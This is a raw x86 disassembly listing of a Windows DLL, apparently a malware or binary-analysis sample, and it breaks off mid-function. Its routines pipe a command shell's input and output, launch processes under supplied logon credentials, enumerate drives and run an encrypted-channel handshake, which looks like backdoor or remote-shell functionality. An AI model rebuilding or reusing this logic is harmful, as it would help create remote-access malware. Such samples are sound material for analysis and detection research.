push ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
push [ edi ]
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_10004a44
mov eax [ ebp - 0x8 ]
mov ecx [ rw-data ]
add eax 0xa
mov [ ebp - 0x81c ] 0xa
mov [ ebp - 0x820 ] eax
push eax
lea eax [ ebp - 0x820 ]
push eax
call sub_100038ee
mov ecx rw-data
call sub_10004a4c
push 0xc8
jmp r-xdata
lea ecx [ ebp - 0x818 ]
call [ Sleep@IAT ]
jmp r-xdata
mov [ ecx ] al
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
inc ecx
inc eax
cmp eax [ ebp - 0x8 ]
mov [ ebp + 0x8 ] eax
jb r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
mov al [ ebp + eax - 0x404 ]
cmp al 0xa
jne r-xdata
mov [ ecx ] 0xd
inc ecx
sub_10002664
push ebp
mov ebp esp
sub esp 0x114
and [ ebp - 0x4 ] 0x0
push esi
push edi
push 0x1c
call [ malloc@IAT ]
push 0x1c
mov edi eax
push [ ebp + 0x8 ]
push edi
call memcpy
add esp 0x10
mov esi rw-data
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push [ rw-data ]
call [ ResetEvent@IAT ]
push 0x10e
lea eax [ ebp - 0x114 ]
push 0x0
push eax
call memset
push esi
call strlen
mov [ ebp - 0x4 ] eax
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
call memcpy
mov eax [ ebp - 0x4 ]
add esp 0x1c
lea ecx [ ebp - 0x4 ]
mov [ ebp + eax - 0x114 ] 0xd
mov [ ebp + eax - 0x113 ] 0xa
push 0x0
add eax 0x2
push ecx
push eax
lea eax [ ebp - 0x114 ]
push eax
push [ edi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push eax
call [ ExitThread@IAT ]
sub_10002711
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
xor edi edi
push 0x1c
mov esi rw-data
push edi
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] edi
push edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0xc
push eax
push esi
mov esi [ CreatePipe@IAT ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0x1
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
lea eax [ ebp - 0x8 ]
push rw-data
push eax
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_100027ea
mov esi [ CloseHandle@IAT ]
pop ecx
pop ecx
mov [ rw-data ] eax
push [ ebp - 0x8 ]
call esi
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push eax
call esi
cmp [ ebp - 0x4 ] edi
je r-xdata
push eax
call esi
pop edi
pop esi
leave
retn
jmp r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
push eax
call esi
push [ ebp - 0x8 ]
jmp r-xdata
call esi
sub_100027ea
push ebp
mov ebp esp
sub esp 0x15c
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
xor esi esi
push edi
mov edi [ GetCurrentProcess@IAT ]
mov [ ebp - 0x10 ] eax
push esi
push 0x1
lea eax [ ebp - 0x8 ]
push 0x2
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x48 ] 0x44
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x18 ] si
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x16 ] si
mov [ ebp - 0x1c ] 0x101
mov [ ebp - 0xc ] ebx
call edi
push eax
push ebx
call edi
push eax
call [ DuplicateHandle@IAT ]
lea eax [ ebp - 0x15c ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push esi
push esi
push esi
push 0x1
push esi
lea eax [ ebp - 0x15c ]
push esi
push eax
push esi
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push [ ebp - 0x54 ]
mov esi [ ebp - 0x58 ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
sub_100028a1
mov eax sub_10004f88
call _EH_prolog
mov eax 0x200c
call sub_10002e90
push esi
lea ecx [ ebp - 0x14 ]
call sub_10004a54
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_10004c1f
push 0x2004
lea eax [ ebp - 0x2018 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x2010 ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x2014 ] 0xc
push eax
call sub_10004ac4
lea eax [ ebp - 0x2010 ]
push eax
call strlen
pop ecx
mov esi rw-data
add eax 0x9
mov ecx esi
mov [ ebp - 0x2018 ] eax
call sub_10004a44
push [ ebp - 0x2018 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x2018 ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10004a5e
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_10002953
mov eax sub_10004f9c
call _EH_prolog
sub esp 0x210
and [ ebp - 0x21c ] 0x0
push esi
push edi
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x21b ]
and [ ebp - 0x118 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x117 ]
[ edi ]
stosw [ edi ]
lea ecx [ ebp - 0x14 ]
stosb [ edi ]
call sub_10004a54
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_10004c1f
push [ ebp + 0x8 ]
mov [ ebp - 0x114 ] 0xd
call [ atoi@IAT ]
mov esi eax
pop ecx
test esi esi
jne r-xdata
push esi
lea ecx [ ebp - 0x14 ]
call sub_10004dfc
push esi
mov edi eax
push rw-data
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_10004e5b
push [ ebp + 0x8 ]
mov edi eax
push rw-data
jmp r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x21c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call strcpy
jmp r-xdata
lea eax [ ebp - 0x21c ]
push eax
call [ sprintf@IAT ]
add esp 0xc
test edi edi
je r-xdata
add esp 0x10
lea eax [ ebp - 0x110 ]
push eax
call strlen
pop ecx
mov esi rw-data
add eax 0x9
mov ecx esi
mov [ ebp - 0x118 ] eax
call sub_10004a44
push [ ebp - 0x118 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x118 ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10004a5e
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_10002aa1
push ebp
mov ebp esp
mov eax 0x205c
call sub_10002e90
push ebx
push esi
push edi
push 0x44
pop esi
xor edi edi
push esi
lea eax [ ebp - 0x58 ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call memset
add esp 0xc
lea eax [ ebp - 0x58 ]
push eax
call [ GetStartupInfoA@IAT ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x28 ] di
mov edi rw-data
push 0x4
mov [ ebp - 0x58 ] esi
mov esi [ _strnicmp@IAT ]
push edi
push ebx
mov [ ebp - 0x2c ] 0x101
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebx + 0x40 ]
push 0x4
push edi
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
push 0x20
push eax
push ebx
call memset
add esp 0xc
lea eax [ ebx + 0x20 ]
push 0x4
push edi
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
push 0x20
push eax
lea eax [ ebx + 0x40 ]
push eax
call memset
add esp 0xc
xor esi esi
xor esi esi
push 0x20
lea eax [ ebx + 0x20 ]
push esi
push eax
call memset
add esp 0xc
jmp r-xdata
lea edx [ ebp - 0x4 ]
push edx
push esi
push 0x2
pop edi
push edi
push eax
push ecx
push ebx
call [ LogonUserA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
add ebx 0x60
push eax
lea eax [ ebp - 0x58 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ebx
push esi
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
movsx edx [ ebx + 0x20 ]
movsx ecx [ ebx ]
lea eax [ ebx + 0x20 ]
add edx ecx
movsx edi [ ebx + 0x40 ]
lea ecx [ ebx + 0x40 ]
add edx edi
jne r-xdata
lea eax [ ebp - 0x14 ]
add ebx 0x60
push eax
lea eax [ ebp - 0x58 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ebx
push esi
push [ ebp - 0x4 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x2058 ] 0x13
mov [ ebp - 0x2050 ] eax
mov [ ebp - 0x2054 ] 0x3
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
mov [ ebp - 0x2058 ] 0x13
mov [ ebp - 0x2050 ] eax
mov [ ebp - 0x2054 ] 0x4
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x2058 ] 0x13
mov [ ebp - 0x2050 ] eax
mov [ ebp - 0x2054 ] edi
mov esi rw-data
mov [ ebp - 0x205c ] 0x11
mov ecx esi
call sub_10004a44
push [ ebp - 0x205c ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x205c ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
sub_10002c52
push ebp
mov ebp esp
mov eax 0x221c
call sub_10002e90
push ebx
push esi
push edi
mov edi 0x130
push edi
call ??2@YAPAXI@Z
mov [ rw-data ] eax
mov esi eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov [ esp ] 0x200
lea eax [ ebp - 0x218 ]
push ebx
push eax
mov [ ebp - 0x2218 ] 0xe
mov [ ebp - 0x8 ] ebx
call memset
push edi
push ebx
push [ rw-data ]
call memset
add esp 0x18
lea eax [ ebp - 0x218 ]
push eax
push 0x68
call [ GetLogicalDriveStringsA@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
lea ebx [ esi + 0x124 ]
push eax
push ebx
call strcpy
push ebx
call [ _strupr@IAT ]
add esp 0xc
push ebx
call [ GetDriveTypeA@IAT ]
cmp [ ebx ] 0x41
mov [ esi + 0x120 ] eax
je r-xdata
and [ eax + 0x2 ] 0x0
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x10 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
jne r-xdata
push edi
mov ebx esi
call ??2@YAPAXI@Z
mov esi eax
push edi
push 0x0
push esi
call memset
add [ ebp - 0x4 ] 0x4
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
add esp 0x10
cmp eax [ ebp - 0x10 ]
mov [ ebx ] esi
jbe r-xdata
mov eax 0x80
lea edx [ esi + 0xa0 ]
push eax
push edx
lea edx [ ebp - 0x18 ]
push edx
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
lea eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ ebp + eax - 0x218 ]
push eax
call [ GetVolumeInformationA@IAT ]
mov eax [ ebp - 0x4 ]
push rw-data
lea eax [ ebp + eax - 0x218 ]
push eax
call strcat
pop ecx
pop ecx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
cmp [ ebx ] 0x41
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x216 ] 0x5c
lea eax [ ebp + eax - 0x218 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
lea ebx [ ebp - 0x2213 ]
shr eax 0x2
mov [ rw-data ] al
mov [ ebp - 0x2214 ] al
mov esi [ ebp - 0xc ]
push edi
push esi
push ebx
call memcpy
mov eax [ esi ]
add [ ebp - 0x8 ] edi
add esp 0xc
add ebx edi
cmp [ eax ] 0x0
mov [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esi rw-data
add eax 0xc
mov ecx esi
mov [ ebp - 0x221c ] eax
call sub_10004a44
push [ ebp - 0x221c ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x221c ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
pop edi
pop esi
pop ebx
leave
retn
sub_10002e90
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10002ed2
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10002ed2
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100010a8
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10002ed2
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10002ed2
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1000303a
mov eax sub_10004fa8
call _EH_prolog
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
cmp [ esi + 0x18 ] 0x0
je r-xdata
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ esi + 0x18 ] eax
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
inc eax
push eax
push [ ebp + 0x8 ]
push [ esi + 0x18 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10003ffb
mov ecx esi
call sub_100030c4
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
push 0x1
call sub_100040ca
mov ecx esi
call sub_10003eb6
sub_100030c4
mov eax sub_10004fd0
call _EH_prolog
sub esp 0x3c
push ebx
push esi
mov esi ecx
xor ebx ebx
lea ecx [ ebp - 0x38 ]
push edi
mov eax [ esi + 0x2c ]
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x44 ] 0x1
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x48 ] ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] ebx
push ecx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x34 ] 0x2
push [ esi + 0x28 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
push ebx
push ebx
push 0x10
push ebx
push 0x8c11c
push [ esi + 0x18 ]
push ebx
push [ esi + 0x24 ]
call [ eax + 0x18 ]
mov edi eax
cmp edi 0x90320
jne r-xdata
cmp edi 0x90312
je r-xdata
push esi
call [ esi + 0x8 ]
pop ecx
cmp [ ebp - 0x38 ] ebx
mov [ esi + 0x14 ] 0x1
je r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
call sub_10004182
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ ebp - 0x30 ] ebx
je r-xdata
xor eax eax
push edi
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x20 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_10003218
jmp r-xdata
push [ ebp - 0x38 ]
mov ecx esi
push [ ebp - 0x30 ]
call sub_10003e5d
cmp al bl
jne r-xdata
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x20 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_100032ff
jmp r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
sub_10003218
mov eax sub_10004fe5
call _EH_prolog
push esi
mov esi ecx
push [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x18 ] esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_1000326b
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x14
sub_1000326b
mov eax sub_10004ff9
call _EH_prolog
push esi
push edi
mov esi ecx
mov eax [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x4 ] eax
mov al [ ebp + 0x8 ]
lea edi [ esi + 0x8 ]
push 0x0
mov ecx edi
mov [ edi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx edi
push [ eax ]
lea eax [ ebp + 0x8 ]
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x14
sub_100032ff
mov eax sub_1000500d
call _EH_prolog
push esi
mov esi ecx
push [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x18 ] esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_10003218
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x14
sub_10003352
mov eax sub_10005046
call _EH_prolog
sub esp 0xcc
and [ ebp - 0x14 ] 0x0
push ebx
push esi
push edi
mov ebx ecx
push 0x2
pop edi
lea ecx [ ebp - 0x2c ]
mov eax [ ebx + 0x2c ]
xor esi esi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x58 ] 0x1
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x90312
lea ecx [ ebp - 0x74 ]
mov eax [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
mov eax [ eax ]
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
push ecx
mov eax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x3c ]
push esi
push ecx
push 0x10
push esi
push 0x8c11c
push esi
push [ ebx + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x2c ]
mov [ ebp - 0x28 ] edi
push [ ebx + 0x24 ]
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x44 ] esi
call [ eax + 0x18 ]
cmp eax esi
mov [ ebp - 0x10 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x90320
jne r-xdata
cmp [ ebp - 0x4c ] esi
je r-xdata
cmp eax 0x90312
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_10004182
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x3c ]
call sub_100041b6
mov al 0x1
push esi
lea ecx [ ebp - 0x5c ]
call sub_1000419a
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x44 ] esi
je r-xdata
cmp eax esi
jge r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_10004182
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x3c ]
call sub_100041b6
xor al al
jmp r-xdata
cmp eax esi
je r-xdata
push [ ebp - 0x4c ]
mov ecx ebx
push [ ebp - 0x44 ]
call sub_10003e5d
test al al
je r-xdata
cmp eax 0x80090318
je r-xdata
test [ ebp - 0x5f ] 0x40
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
cmp [ ebp - 0x1c ] 0x5
jne r-xdata
jl r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax + 0x8 ] esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
push [ ebp - 0x20 ]
call [ malloc@IAT ]
mov edi [ ebp + 0x10 ]
cmp eax esi
pop ecx
mov [ edi + 0x8 ] eax
jne r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x4
je r-xdata
cmp eax 0x90320
jne r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_100032ff
jmp r-xdata
mov ebx [ ebx + 0x10 ]
cmp ebx esi
je r-xdata
push 0x18
xor eax eax
pop ecx
lea edi [ ebp - 0xd6 ]
mov [ ebp - 0xd8 ] si
push 0x32
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0xd8 ]
push eax
push [ ebx + 0x18 ]
call strlen
pop ecx
inc eax
push eax
push [ ebx + 0x18 ]
push esi
push esi
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0xd8 ]
push esi
push eax
push [ ebx + 0x28 ]
push [ ebx + 0x2c ]
push 0x1
call sub_100042e1
add esp 0xc
lea esi [ ebp - 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call [ ebx + 0xc ]
and [ ebx + 0xc ] 0x0
add esp 0xc
xor esi esi
mov ecx [ ebp + 0xc ]
push [ ebp - 0x20 ]
mov ecx [ ecx ]
sub ecx [ ebp - 0x20 ]
add ecx [ ebp + 0x8 ]
push ecx
push eax
call [ memmove@IAT ]
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ edi ] eax
mov [ edi + 0x4 ] 0x2
jmp r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push [ ebp - 0x10 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_10003218
jmp r-xdata
cmp [ ebp - 0x1c ] 0x5
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp eax esi
je r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
call ebx
jmp r-xdata
and [ ebx + 0x14 ] 0x0
cmp [ ebx + 0xc ] esi
je r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_10003218
jmp r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
push [ ebp - 0x20 ]
mov eax [ eax ]
sub eax [ ebp - 0x20 ]
add eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call [ memmove@IAT ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ ecx ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x90312
je r-xdata
push ebx
call eax
pop ecx
jmp r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
sub_100036aa
mov eax sub_1000505a
call _EH_prolog
sub esp 0xc
mov eax [ ecx + 0x2c ]
push esi
push edi
